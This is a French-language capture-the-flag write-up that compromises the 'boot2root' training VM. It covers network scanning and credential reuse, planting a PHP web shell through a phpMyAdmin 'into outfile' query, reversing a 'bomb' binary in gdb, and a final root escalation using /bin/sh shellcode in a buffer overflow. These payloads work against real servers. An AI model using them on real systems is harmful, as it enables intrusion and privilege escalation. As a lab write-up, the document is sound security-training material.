% writeup1 boot2roo

# Writeup1

## Pré-requis

Avant de commencer cet _exploit_, vérifiez que ces pré-requis sont présents :

- Une machine virtuelle : au choix `VMware` ou `VirtualBox`. Nous avons préféré `VMware`.
- `nmap` : faites `brew install nmap`, l'installation prend une dizaine de minutes.
- python 3.x.

## Préliminaires

> __Avertissement__ : l'adresse IP présente dans ce writeup est un exemple, elle peut changer.

Lancez la VM.

Les étapes suivantes sont reprises dans le `script1.sh`.

Un `ifconfig` nous permet de voir les IPs disponibles sur notre machine.

```bash
$> ifconfig
[...]
vmnet8: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	ether 00:50:56:c0:00:08
	inet 192.168.85.1 netmask 0xffffff00 broadcast 192.168.85.255
```

`vmnet8` correspond à notre machine virtuelle. Dans l'exemple précédent l'IP correspondante est `192.168.85.1`. Nous allons utiliser le logiciel `nmap` pour écouter les ports, de 1 à 255, qui sont utilisés :

```bash
$> nmap 192.168.85.1-255
[...]
Nmap scan report for 192.168.85.1
Host is up (0.00015s latency).
Not shown: 969 closed ports, 28 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
111/tcp open  rpcbind
668/tcp open  mecomm

Nmap scan report for 192.168.85.136
Host is up (0.00050s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
[...]
``` 

Nous constatons que l'IP `192.168.85.136` possède de multiples ports ouverts : `ssh`, `http`, `https`, `imap`, etc. Vous pouvez tester dans un navigateur d'aller voir `http://192.168.85.136` : un page statique s'affiche mais rien d'intéressant à en tirer.

Afin d'avoir une idée plus précise de l'architecture du site, nous utilisons le logiciel `dirb` qui va tester de multiples chemin et nous retourner ceux qui ne renvoient pas d'erreurs.

Nous lançons le programme dirb qui prends deux arguments :

```bash
$> ./dirb https://192.168.85.136/ dirb222/wordlists/common.txt
[...]
---- Scanning URL: https://192.168.85.136/ ----
+ https://192.168.85.136/cgi-bin/ (CODE:403|SIZE:291)
==> DIRECTORY: https://192.168.85.136/forum/
==> DIRECTORY: https://192.168.85.136/phpmyadmin/
+ https://192.168.85.136/server-status (CODE:403|SIZE:296)
==> DIRECTORY: https://192.168.85.136/webmail/
[...]
```

Grâce à cela, nous pouvons voir que le serveur a un `/forum`, un `/phpmyadmin` et un `/webmail`. De plus, nous avons accès directement à plusieurs dossiers et sous-dossiers.

## Le forum

Rendez vous sur le forum : `https://192.168.85.136/forum`. `lmezard` a posté un topic : `Probleme login ?`. En observant les informations, nous constatons que le mot `password` revient souvent. En faisant une recherche dessus nous repérons une ligne particulière :

```text
[...]
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
[...]
```

`!q\]Ej?*5K5cy*AJ` correspond au mot de passe de `lmezard` ! Connectez vous à l'aide de ces identifiants et rendez vous dans le panneau de configuration. Nous pouvons récupérer son mail : `laurie@borntosec.net`. Il y a sûrement quelque chose à tenter avec ce dernier puisque nous savons que le serveur possède un serveur mail `imap`.

## Le mail

Rendez vous maintenant sur le webmail : `https://192.168.85.136/webmail`. Nous savons que son mail est `laurie@borntosec.net`. Se pourrait-il que cet utilisateur utilise le même mot de passe que pour le forum ?! Oui ! L'erreur de Laurie aura été de garder le même mot de passe sur le forum et sur sa boîte mail... Connectez vous avec : `!q\]Ej?*5K5cy*AJ`.

Nous tombons sur un mail `DB Access`. Dans ce mail, le login `root` et le password `Fg-'kKXBj87E:aJ$` sont laissés en clair. Nous pouvons tranquillement nous connecter à PhpMyAdmin, c'est du propre !

## PhpMyAdmin

Connectez vous à `https://192.168.85.136/phpmyadmin` avec les informations au dessus.

Nous avons la possibilité de faire une injection SQL. Cliquez sur l'onglet SQL et copiez/collez la ligne suivante :

```sql
select "<? System($_REQUEST['cmd']); ?>" into outfile "/var/www/forum/templates_c/inject.php";
```

En utilisant les informations données par `dirb` et en testant différents dossiers nous trouvons un sous-dossier libre d'accès : `/var/www/forum/templates_c/`.

Cette injection SQL va nous permettre ensuite d'exécuter des commandes shells directement dans la barre de navigation comme celle-ci : `https://192.168.85.136/forum/templates_c/inject.php?cmd=ls%20/home`. Nous pouvons ainsi explorer les dossiers et fichiers qui se trouvent sur le serveur.

En rentrant cela dans votre barre de navigation :

```
https://192.168.85.136/forum/templates_c/inject.php?cmd=cat%20/home/LOOKATME/password
```

Vous découvrez de nouvelles informations intéressantes : `lmezard:G!@M6f4Eatau{sF"`. Cela ressemble beaucoup à un identifiant et un mot de passe, n'est-ce-pas ?

## La VM

Vous pouvez maintenant vous connecter à la VM. Un fichier `fun` est présent et un `README`. Nous allons modifier les droits d'accès afin de récupérer ce fichier :

```bash
$> cd ..
$> chmod 777 lmezard
$> cd lmezard
$> chmod 777 fun
```

Vous pouvez maintenant récupérer son contenu sur votre Mac en utilisant l'injection SQL `https://192.168.85.136/forum/templates_c/inject.php?cmd=cat%20/home/lmezard/fun` qui affichera le contenu. Il suffit de le copier/coller dans un nouveau fichier `fun.c`.

## fun

### main

C'est un vrai bazard ! Après un peu d'investigation et de nettoyage du fichier nous obtenons la fonction `main` qui suit :

```C
int main() 
{
    printf("M");
    printf("Y");
    printf(" ");
    printf("P");
    printf("A");
    printf("S");
    printf("S");
    printf("W");
    printf("O");
    printf("R");
    printf("D");
    printf(" ");
    printf("I");
    printf("S");
    printf(":");
    printf(" ");
    printf("%c",getme1());
    printf("%c",getme2());
    printf("%c",getme3());
    printf("%c",getme4());
    printf("%c",getme5());
    printf("%c",getme6());
    printf("%c",getme7());
    printf("%c",getme8());
    printf("%c",getme9());
    printf("%c",getme10());
    printf("%c",getme11());
    printf("%c",getme12());
    printf("\n");
    printf("Now SHA-256 it and submit");
}
```

### getme

Nous avons donc 12 fonctions `getme` qui renvoient un caractère.

En utilisant la fonction `grep` sur un fichier `fun` un minimum propre nous trouvons :

```C
char getme8() { return 'w'; }
char getme9() { return 'n'; }
char getme10() { return 'a'; }
char getme11() { return 'g'; }
char getme12() { return 'e'; }
```

Ces fonctions sont faciles à comprendre. Cependant, il nous manque 7 autres `getme`. Les suivantes sont un poil plus compliquées à interpréter. Par exemple, nous avons :

```C
getme6() { //file521ft_fun/AW0DQ.pcap0000640000175000001440000000003412563172202012520 0ustar nnmusers}
```

Nous constatons qu'il y a un commentaire avec une mention `file521`. En cherchant la ligne où se situe `file522` nous obtenons :

```bash
$> grep -in file522 fun_formatted.c
888:void useless() { //file406ft_fun/T7VV0.pcap0000640000175000001440000000002712563172202012534 0ustar nnmusers	return 'r'; //file369ft_fun/KV7B9.pcap0000640000175000001440000000005312563172202012507 0ustar nnmusers	printf("Hahahaha Got you!!!\n"); //file23ft_fun/J5LKW.pcap0000640000175000001440000000002712563172202012542 0ustar nnmusers	return 't'; //file522ft_fun/KVYKW.pcap0000640000175000001440000000005312563172202012620 0ustar nnmusers	printf("Hahahaha Got you!!!\n"); //file45ft_fun/GXPKY.pcap0000640000175000001440000000003412563172202012606 0ustar nnmusers}
```

Nous constatons qu'il y a un `return 't'` juste avant `//file522`. Cela correspond à notre `getme6()` ! De la même manière, nous trouvons :

```C
char getme1() { return 'I'; }
char getme2() { return 'h'; }
char getme3() { return 'e'; }
char getme4() { return 'a'; }
char getme5() { return 'r'; }
char getme6() { return 't'; }
char getme7() { return 'p'; }
```

Ce qui nous donne `Iheartpwnage` que nous hashons en `sha256` : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.

Vous pouvez donc vous connecter en `ssh` avec le login `laurie` et le mot de passe au-dessus :

```bash
$> ssh laurie@192.168.85.136
```

## Bomb

Une fois connecté, vous vous retrouvez avec une `bomb` à désamorcer. C'est un exécutable qui semble prendre plusieurs mots de passe et l'ensemble de ces mots de passe nous donnerons le mot de passe `ssh` pour le compte `thor`.

Nous allons effectuer plusieurs étapes pour trouver les mots de passe qui permettent de désamorcer la bombe. Parfois simplement en explorant le binaire ou bien en faisant un peu de _reverse-engineering_. Pour se faire, nous utiliserons quatre outils utiles :

- `gdb` : le débugueur GNU, extrêmement pratique pour suivre notre programme,
- `objdump -t` : nous révèle les symboles,
- `objdump -d` : affiche le code assembleur,
- `strings` : affiche tout ce qui peut l'être à partir de notre binaire.

### 1ère étape

En explorant le binaire (notamment en faisant `objdump -d bomb`), nous constatons la présence de `<phase_1>`, `<phase_2>`, etc. qui se succèdent dans `<main>`. Cela correspond aux différentes étapes à passer.

L'étude de cette fonction nous montre le modèle suivant : la fonction prend une _string_ et la stock dans un registre pour la comparer à une autre _string_ présente à une certaine adresse. Nous pouvons donc aller voir quelle est cette chaîne de caractères :

```bash
$> gdb bomb
[...]
(gdb) break phase_1
Breakpoint 1 at 0x8048b26
(gdb) run
Starting program: /home/laurie/bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
test

Breakpoint 1, 0x08048b26 in phase_1 ()
(gdb) p/x $eax
$1 = 0x804b680
(gdb) x /25c 0x804b680
0x804b680 <input_strings>:	116 't'	101 'e'	115 's'	116 't'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0x804b688 <input_strings+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0x804b690 <input_strings+16>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0x804b698 <input_strings+24>:	0 '\000'
(gdb) x /25c 0x80497c0
0x80497c0:	80 'P'	117 'u'	98 'b'	108 'l'	105 'i'	99 'c'	32 ' '	115 's'
0x80497c8:	112 'p'	101 'e'	97 'a'	107 'k'	105 'i'	110 'n'	103 'g'	32 ' '
0x80497d0:	105 'i'	115 's'	32 ' '	118 'v'	101 'e'	114 'r'	121 'y'	32 ' '
0x80497d8:	101 'e'
```

Nous avons donc une comparaison avec une _string_ qui ressemble à "Public speaking is very e". Un simple `strings bomb | grep P` nous permet de tomber sur cette _string_ : `Public speaking is very easy.` !

### 2ème étape

En observant `<phase_2>` avec `objdump -d bomb`, nous notons un appel à la fonction `<read_six_numbers>`. Cette fonction vérifie que l'entrée correspond à 6 _integers_ séparés par des espaces.

Dans `gdb`, nous pouvons donc fixer un _breakpoint_ sur `<phase_2>` et puis faire un `disas` qui va nous afficher le code assembleur de la fonction :

```
Dump of assembler code for function phase_2:
   0x08048b48 <+0>:	push   %ebp
   0x08048b49 <+1>:	mov    %esp,%ebp
   0x08048b4b <+3>:	sub    $0x20,%esp
   0x08048b4e <+6>:	push   %esi
   0x08048b4f <+7>:	push   %ebx
   0x08048b50 <+8>:	mov    0x8(%ebp),%edx
   0x08048b53 <+11>:	add    $0xfffffff8,%esp
   0x08048b56 <+14>:	lea    -0x18(%ebp),%eax
   0x08048b59 <+17>:	push   %eax
   0x08048b5a <+18>:	push   %edx
   0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
   0x08048b60 <+24>:	add    $0x10,%esp
   0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)
   0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
   0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
   0x08048b6e <+38>:	mov    $0x1,%ebx
   0x08048b73 <+43>:	lea    -0x18(%ebp),%esi
   0x08048b76 <+46>:	lea    0x1(%ebx),%eax
   0x08048b79 <+49>:	imul   -0x4(%esi,%ebx,4),%eax
   0x08048b7e <+54>:	cmp    %eax,(%esi,%ebx,4)
   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:	inc    %ebx
   0x08048b89 <+65>:	cmp    $0x5,%ebx
   0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
   0x08048b8e <+70>:	lea    -0x28(%ebp),%esp
   0x08048b91 <+73>:	pop    %ebx
   0x08048b92 <+74>:	pop    %esi
   0x08048b93 <+75>:	mov    %ebp,%esp
   0x08048b95 <+77>:	pop    %ebp
   0x08048b96 <+78>:	ret
End of assembler dump.
```

Nous constatons qu'il y a deux appels à `<explode_bomb>`. Le premier se fait après une comparaison (`cmpl`) entre la valeur à l'adresse `%ebp - 0x18` et la valeur fixe `$0x1`. Cela veut dire que c'est une comparaison à `1` ! Nous avons notre premier nombre.

Un peu avant le second appel à `<explode_bomb>` nous remarquons une multiplication signée, `imul`. Le résultat de la multiplication est stocké dans `%eax` qui est ensuite comparé à une autre valeur.

Nous pouvons en déduire que la suite que nous avons sous les yeux est une suite de nombres factoriels :

```
1! = 1
2! = 1 * 2 = 2
3! = 1 * 2 * 3 = 6
4! = 1 * 2 * 3 * 4 = 24
5! = 1 * 2 * 3 * 4 * 5 = 120
6! = 1 * 2 * 3 * 4 * 5 * 6 = 720
```

Nous avons donc la suite suivante en mot de passe pour `phase_2` : `1 2 6 24 120 720`.

### 3ème étape

Voici un _dump_ de `phase_3` :

```
Dump of assembler code for function phase_3:
   0x08048b98 <+0>:	push   %ebp
   0x08048b99 <+1>:	mov    %esp,%ebp
   0x08048b9b <+3>:	sub    $0x14,%esp
   0x08048b9e <+6>:	push   %ebx
   0x08048b9f <+7>:	mov    0x8(%ebp),%edx
   0x08048ba2 <+10>:	add    $0xfffffff4,%esp
   0x08048ba5 <+13>:	lea    -0x4(%ebp),%eax
   0x08048ba8 <+16>:	push   %eax
   0x08048ba9 <+17>:	lea    -0x5(%ebp),%eax
   0x08048bac <+20>:	push   %eax
   0x08048bad <+21>:	lea    -0xc(%ebp),%eax
   0x08048bb0 <+24>:	push   %eax
   0x08048bb1 <+25>:	push   $0x80497de
   0x08048bb6 <+30>:	push   %edx
   0x08048bb7 <+31>:	call   0x8048860 <sscanf@plt>
   0x08048bbc <+36>:	add    $0x20,%esp
   0x08048bbf <+39>:	cmp    $0x2,%eax
   0x08048bc2 <+42>:	jg     0x8048bc9 <phase_3+49>
   0x08048bc4 <+44>:	call   0x80494fc <explode_bomb>
   0x08048bc9 <+49>:	cmpl   $0x7,-0xc(%ebp)
   0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
   0x08048bd3 <+59>:	mov    -0xc(%ebp),%eax
   0x08048bd6 <+62>:	jmp    *0x80497e8(,%eax,4)
   0x08048bdd <+69>:	lea    0x0(%esi),%esi
   0x08048be0 <+72>:	mov    $0x71,%bl
   0x08048be2 <+74>:	cmpl   $0x309,-0x4(%ebp)
   0x08048be9 <+81>:	je     0x8048c8f <phase_3+247>
   0x08048bef <+87>:	call   0x80494fc <explode_bomb>
   0x08048bf4 <+92>:	jmp    0x8048c8f <phase_3+247>
   0x08048bf9 <+97>:	lea    0x0(%esi,%eiz,1),%esi
   0x08048c00 <+104>:	mov    $0x62,%bl
   0x08048c02 <+106>:	cmpl   $0xd6,-0x4(%ebp)
   0x08048c09 <+113>:	je     0x8048c8f <phase_3+247>
   0x08048c0f <+119>:	call   0x80494fc <explode_bomb>
   0x08048c14 <+124>:	jmp    0x8048c8f <phase_3+247>
   0x08048c16 <+126>:	mov    $0x62,%bl
   0x08048c18 <+128>:	cmpl   $0x2f3,-0x4(%ebp)
   0x08048c1f <+135>:	je     0x8048c8f <phase_3+247>
   0x08048c21 <+137>:	call   0x80494fc <explode_bomb>
   0x08048c26 <+142>:	jmp    0x8048c8f <phase_3+247>
   0x08048c28 <+144>:	mov    $0x6b,%bl
   0x08048c2a <+146>:	cmpl   $0xfb,-0x4(%ebp)
   0x08048c31 <+153>:	je     0x8048c8f <phase_3+247>
   0x08048c33 <+155>:	call   0x80494fc <explode_bomb>
   0x08048c38 <+160>:	jmp    0x8048c8f <phase_3+247>
   0x08048c3a <+162>:	lea    0x0(%esi),%esi
   0x08048c40 <+168>:	mov    $0x6f,%bl
   0x08048c42 <+170>:	cmpl   $0xa0,-0x4(%ebp)
   0x08048c49 <+177>:	je     0x8048c8f <phase_3+247>
   0x08048c4b <+179>:	call   0x80494fc <explode_bomb>
   0x08048c50 <+184>:	jmp    0x8048c8f <phase_3+247>
   0x08048c52 <+186>:	mov    $0x74,%bl
   0x08048c54 <+188>:	cmpl   $0x1ca,-0x4(%ebp)
   0x08048c5b <+195>:	je     0x8048c8f <phase_3+247>
   0x08048c5d <+197>:	call   0x80494fc <explode_bomb>
   0x08048c62 <+202>:	jmp    0x8048c8f <phase_3+247>
   0x08048c64 <+204>:	mov    $0x76,%bl
   0x08048c66 <+206>:	cmpl   $0x30c,-0x4(%ebp)
   0x08048c6d <+213>:	je     0x8048c8f <phase_3+247>
   0x08048c6f <+215>:	call   0x80494fc <explode_bomb>
   0x08048c74 <+220>:	jmp    0x8048c8f <phase_3+247>
   0x08048c76 <+222>:	mov    $0x62,%bl
   0x08048c78 <+224>:	cmpl   $0x20c,-0x4(%ebp)
   0x08048c7f <+231>:	je     0x8048c8f <phase_3+247>
   0x08048c81 <+233>:	call   0x80494fc <explode_bomb>
   0x08048c86 <+238>:	jmp    0x8048c8f <phase_3+247>
   0x08048c88 <+240>:	mov    $0x78,%bl
   0x08048c8a <+242>:	call   0x80494fc <explode_bomb>
   0x08048c8f <+247>:	cmp    -0x5(%ebp),%bl
   0x08048c92 <+250>:	je     0x8048c99 <phase_3+257>
   0x08048c94 <+252>:	call   0x80494fc <explode_bomb>
   0x08048c99 <+257>:	mov    -0x18(%ebp),%ebx
   0x08048c9c <+260>:	mov    %ebp,%esp
   0x08048c9e <+262>:	pop    %ebp
   0x08048c9f <+263>:	ret
End of assembler dump.
```

Nous pouvons constater un appel à `sscanf` ce qui est intéressant car elle prend en argument un _input string_ et un _format string_. Le _format string_ se trouve dans le registre `edx` et l'_input string_ ressemble à cela :

```
(gdb) x/s 0x80497de
0x80497de:	 "%d %c %d"
```

Nous savons alors que le mot de passe contiendra : un `int`, un `char` et un `int`.
Nous pouvons relancer ainsi gdb avec ces paramètres : `1 a 2`.

```
(gdb) x/10i $pc
=> 0x8048b9f <phase_3+7>:	mov    0x8(%ebp),%edx
   0x8048ba2 <phase_3+10>:	add    $0xfffffff4,%esp
   0x8048ba5 <phase_3+13>:	lea    -0x4(%ebp),%eax
   0x8048ba8 <phase_3+16>:	push   %eax
   0x8048ba9 <phase_3+17>:	lea    -0x5(%ebp),%eax
   0x8048bac <phase_3+20>:	push   %eax
   0x8048bad <phase_3+21>:	lea    -0xc(%ebp),%eax
   0x8048bb0 <phase_3+24>:	push   %eax
   0x8048bb1 <phase_3+25>:	push   $0x80497de
   0x8048bb6 <phase_3+30>:	push   %edx
```

Nous observons le contenu de _(%ebp - 0xc)_ sur la ligne ci-dessous:

_0x08048bad <+21>:	lea    -0xc(%ebp),%eax_

```
(gdb) x/d (0xbffff708 - 0xc)
0xbffff6fc:	8
```

Le premier int est comparé avec 8, si notre int est inférieur à 8 alors rien ne se passe mais dans le cas contraire nous allons dans la fonction `explode_bomb`.

Ensuite, nous allons voir une insctruction _jmp_ qui jumpera à l'offset de la valeur stocké dans la mémoire _*0x80497e8(,%eax,4)_. Le contenu de _%ebp - 0xc_ est la valeur de notre premier int, dans notre cas : 1.

```
(gdb) until *0x08048bc9
0x08048bc9 in phase_3 ()
(gdb) x/10i $pc
=> 0x8048bc9 <phase_3+49>:	cmpl   $0x7,-0xc(%ebp)
   0x8048bcd <phase_3+53>:	ja     0x8048c88 <phase_3+240>
   0x8048bd3 <phase_3+59>:	mov    -0xc(%ebp),%eax
   0x8048bd6 <phase_3+62>:	jmp    *0x80497e8(,%eax,4)
   0x8048bdd <phase_3+69>:	lea    0x0(%esi),%esi
   0x8048be0 <phase_3+72>:	mov    $0x71,%bl
   0x8048be2 <phase_3+74>:	cmpl   $0x309,-0x4(%ebp)
   0x8048be9 <phase_3+81>:	je     0x8048c8f <phase_3+247>
   0x8048bef <phase_3+87>:	call   0x80494fc <explode_bomb>
   0x8048bf4 <phase_3+92>:	jmp    0x8048c8f <phase_3+247>
(gdb) i r ebp
ebp            0xbffff708	0xbffff708
(gdb) x/d (0xbffff708 - 0xc)
0xbffff6fc:	1
```

Le saut nous amène alors un peu plus loin :
```
(gdb) x/10i $pc
=> 0x8048c00 <phase_3+104>:	mov    $0x62,%bl
   0x8048c02 <phase_3+106>:	cmpl   $0xd6,-0x4(%ebp)
   0x8048c09 <phase_3+113>:	je     0x8048c8f <phase_3+247>
   0x8048c0f <phase_3+119>:	call   0x80494fc <explode_bomb>
```

La troisième valeur, stockée dans _(%ebp - 0x4)_ est alors comparé avec _$0xd6_ ou 214 en décimal.

```
(gdb) i r ebp
ebp            0xbffff708	0xbffff708
(gdb) x/d (0xbffff708 - 0x4)
0xbffff704:	2
(gdb) print/d 0xd6
$1 = 214
```

Nous relancons une troisième fois gdb maintenant que nous avons le dernier int, afin de connaitre le char que l'on recherche.

Nous pouvons avancer jusqu'à la dernière comparaison. Verifions le contenu de _%ebp_ afin de s'assurer que cela contient bien notre char `a`. Puis le contenu de _%bl_

```
(gdb) x/10i $pc
=> 0x8048c8f <phase_3+247>:	cmp    -0x5(%ebp),%bl
   0x8048c92 <phase_3+250>:	je     0x8048c99 <phase_3+257>
   0x8048c94 <phase_3+252>:	call   0x80494fc <explode_bomb>
   0x8048c99 <phase_3+257>:	mov    -0x18(%ebp),%ebx
   0x8048c9c <phase_3+260>:	mov    %ebp,%esp
   0x8048c9e <phase_3+262>:	pop    %ebp
   0x8048c9f <phase_3+263>:	ret
(gdb) i r ebp
ebp            0xbffff708	0xbffff708
(gdb) x/c (0xbffff708 - 0x5)
0xbffff703:	97 'a'
(gdb) i r bl
bl             0x62	98
(gdb) print/c 0x62
$1 = 98 'b'
```

Nous avons maintenant nos trois arguments à passer à la bombe à savoir : `1 b 214`.

### 4ème étape

Suite de Fibonacci.

`9`

### 5ème étape

`opekmq`

### 6ème étape

`4 2 6 3 1 5`

Bravo ! Nous pouvons nous connecter en ssh avec le login : `thor` et le password : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

## turtle

Un fichier `turtle` va nous permettre d'obtenir le mot de passe pour accéder à la session de `zaz`.

Ce fichier contient des instructions de déplacement. Les utilisateurs de Python reconnaîtront les méthodes de la bibliothèque [Turtle](https://docs.python.org/3.0/library/turtle.html). En nettoyant le fichier et en appliquant le script `turtle.py` que nous avons créé, vous obtenez une inscription : `SLASH`.

En hashant ce résultat, nous obtenons : `646da671ca01bb5d84dbb5fb2238dc8e` pour le mot de passe de `zaz`.

## exploit_me

Un exécutable `exploit_me` est présent à la racine. Nous allons utiliser la technique du _buffer overflow_ pour cette partie car le _owner_ est _root_.

Rentrez directement dans le shell :

```bash
$> export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
```

Ce qui correspond à l'ouverture d'un shell en `shellcode`.

Le programme suivant est à copier/coller, à compiler et exécuter. Il renvoit l'adresse à laquelle se trouve la variable d'environnement `SHELLCODE` (que nous avons donc modifié précédemment).

```C
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
    char* ptr = getenv("SHELLCODE");
    printf("%p\n", ptr);
}
```

> Le fichier est aussi disponible dans `scripts/ressources/buffer_overflow.c`.

Nous pouvons exécuter la ligne suivante qui va démarrer le fichier `exploit_me` où `SHELLCODE` est l'adresse de la variable d'environnement `$SHELLCODE` en inversant l'endian (par exemple `0xbffff8f8` devient `\xf8\xf8\xff\xbf`).

```bash
./exploit_me `python -c 'print "\x90" * 140 + "SHELLCODE"'`
```

Nous écrivons donc `\x90` sur 140 octets (qui correspond à un `NOP`, cela passe à l'octet suivant) puis nous passons au `shellcode`.

Le programme va lire le shellcode et ouvrir un nouveau shell en root car l'user qui a crée `./exploit_me` est `root`.

__Bravo ! Vous êtes root !__
